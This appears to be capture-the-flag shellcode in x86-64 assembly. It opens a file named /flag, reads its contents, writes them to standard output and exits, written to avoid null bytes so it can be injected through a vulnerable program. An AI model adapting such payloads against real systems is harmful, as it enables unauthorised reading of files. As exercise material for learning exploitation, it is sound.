.global _start
_start:
.intel_syntax noprefix

        # open
        xor rsi, rsi
        xor rax, rax
        push rax
        mov rbx, 0x67616c66
        shl rbx, 8
        mov bl, 0x2f
        push rbx

        mov rdi, rsp
        mov al, 2
        syscall

        # read
        mov rdi, rax
        mov rsi, rsp
        xor rdx, rdx
        mov dl,100
        xor rax, rax
        syscall

        # write
        xor rdi, rdi
        mov dil, 1
        mov rsi, rsp
        mov rdx, rax
        xor rax, rax
        inc rax
        syscall

        # exit
        xor rax,rax
        mov al, 60
        xor rdi, rdi
        mov dil, 42
        syscall
